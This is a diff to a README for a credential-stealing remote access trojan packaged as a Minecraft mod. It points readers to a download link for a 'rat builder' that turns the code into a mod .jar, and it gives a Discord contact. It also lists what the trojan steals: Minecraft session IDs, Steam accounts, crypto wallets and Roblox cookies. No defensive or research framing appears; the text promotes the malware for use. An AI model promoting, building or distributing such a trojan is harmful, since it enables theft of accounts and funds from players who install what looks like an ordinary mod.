@@ -4,7 +4,7 @@
 
 ### https://discord.gg/aKEYP4cGSq
 
-### to turn this code into a .jar minecraft mod use the rat builder .jar file in https://github.com/iLoveRat/SkyblockRat/releases/tag/fixedratbuilder 
+### to turn this code into a .jar minecraft mod use the rat builder .jar file: https://github.com/ILoveRatter/Minecraft-SSID-stealer/releases/download/ratBuilder/rat.builder.jar
 
 #### The rat steals:
 - minecraft session id
@@ -18,7 +18,7 @@
 - steam accounts
 - crypto wallets
 
-### ill add more stuff if u want me to dm me iloverat.9200 on discord / iloverat#9200 on guilded just dont ask for something stupid like a roblox cookie stealer (it already steals roblox cookies)
+### ill add more stuff if u want me to dm me iloverat.9200 on discord or just dm me anything, i want friends :)
 
   
 #### Embed example: 
